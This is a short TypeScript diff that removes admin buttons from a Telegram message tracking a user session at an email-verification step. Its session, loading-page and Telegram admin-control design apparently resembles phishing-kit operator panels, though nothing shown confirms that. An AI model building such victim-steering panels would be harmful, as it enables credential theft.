@@ -112,13 +112,13 @@ export const updateSessionWithEmail = async (
     session.currentStep = "email_verification";
     activeSessions.set(sessionId, session);
 
-    // Update the existing Telegram message
+    // Update the existing Telegram message (no admin buttons - user not on loading page)
     if (session.messageId) {
       const updatedMessage = formatSessionMessage(session);
       await updateTelegramMessage(
         session.messageId,
         updatedMessage,
-        getAdminKeyboard(sessionId, session),
+        { inline_keyboard: [] }, // No buttons when not on loading page
       );
     }
 
